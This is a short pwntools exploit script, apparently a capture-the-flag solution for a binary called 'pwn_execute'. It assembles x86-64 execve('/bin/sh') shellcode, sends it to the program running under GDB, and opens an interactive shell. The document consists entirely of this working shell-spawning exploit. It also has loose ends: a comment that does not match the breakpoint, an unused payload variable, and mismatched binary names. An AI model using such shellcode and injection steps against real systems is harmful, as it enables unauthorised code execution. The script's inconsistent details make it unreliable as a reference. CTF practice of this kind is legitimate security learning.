from pwn import *

context.binary = 'pwn/pwn_execute/execute'

# Start the binary under GDB and set a breakpoint at `main + 169`
io = gdb.debug('pwn/pwn_execute/execute2', '''
    break *main+115
    continue
''')

payload = f"mov rax, 0x{b"/bin/sh".hex()}"
sh = asm(
    '''
    xor rax, rax
    mov rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch='x86_64'
)

# Send the payload
io.sendline(sh)

# Interact with the program
io.interactive()